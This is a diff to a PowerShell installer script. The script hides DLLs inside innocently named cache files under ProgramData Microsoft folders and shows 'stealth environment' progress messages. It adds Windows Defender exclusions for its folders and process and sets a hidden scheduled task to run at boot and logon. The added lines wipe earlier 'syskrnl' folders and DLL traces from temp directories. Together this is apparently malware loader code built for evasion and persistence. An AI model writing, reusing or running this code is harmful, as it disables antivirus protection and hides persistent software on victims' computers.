@@ -56,6 +56,11 @@ Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | ForEach-Obj
 }
 
 # Stage 1: Initializing & Purging old clusters
+# Purge any old syskrnl folders, temp DLLs or traces completely
+Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "syskrnl_*" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*client.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path "C:\Windows\Temp", $env:TEMP -Filter "*aotbst.dll*" -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+
 Show-Progress -Percent 15 -Status "Initializing stealth environment..."
 if (-not (Test-Path $DEST_DIR)) {
     New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
@@ -94,8 +99,6 @@ Start-Sleep -Milliseconds 350
 Show-Progress -Percent 65 -Status "Sealing component data streams..."
 $MAP = [ordered]@{
     "cimgui.dll" = @("$env:ProgramData\Microsoft\Network\Downloader\winrescache.db", "vtcache")
-    "AotBst.dll" = @("$env:ProgramData\Microsoft\Windows\WER\ReportQueue\gphcache.db", "vtmap")
-    "Client.dll" = @("$env:ProgramData\Microsoft\Windows\DeviceMetadataCache\ntprintcache.db", "vtload")
 }
 foreach ($name in $MAP.Keys) {
     $container = $MAP[$name][0]
@@ -145,9 +148,7 @@ try {
 try {
     Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Network\Downloader" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\WER\ReportQueue" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
+            Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
 } catch {}
 
 # Scheduled Task (Hidden, runs on Boot + Logon)
